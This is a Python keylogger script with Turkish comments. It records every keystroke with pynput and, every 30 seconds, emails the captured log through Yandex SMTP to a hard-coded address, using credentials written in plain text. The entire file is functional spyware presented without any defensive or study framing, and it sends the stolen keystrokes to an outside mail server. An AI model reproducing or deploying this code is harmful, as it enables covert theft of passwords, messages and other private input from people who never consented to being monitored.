import pynput.keyboard
import smtplib
import threading

log = ""

def callback_func(key):
    global log
    try:
        log = log + str(key.char)
        #log = log.encode() + key.char.encode()

    except AttributeError:

        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)

def send_email(email,password,message):

    email_server = smtplib.SMTP("smtp.yandex.com",587)  #host u ve portu yazman lazım str şeklinde
    email_server.starttls() #bu gmail için  yazman gerekli güvenlik için
    email_server.login(email,password)
    email_server.sendmail(email,email,message) #hangi adresten hangi adrese ne gideceğini yazıyon
    email_server.quit()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_func)  #bu her tuşa basıldığında içine yazılan fonksiyonu çalıştırıyor

def thread_func():
    global log
    send_email("mevocan02@yandex.com","obixhsmuylwfpnux",log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(30,thread_func) #kaç saniye de bir hangi fonksiyonu çalıştırayım diye sorar
    timer_object.start()

    #bu işlemi kodu kitlemesin diye sıralama işlemi yapıyoruz paralel çalışıyor tüm fonksiyonlar

with keylogger_listener:
    thread_func()
    keylogger_listener.join()
    #sıralama threading  devamlı arka planda dinleyecek




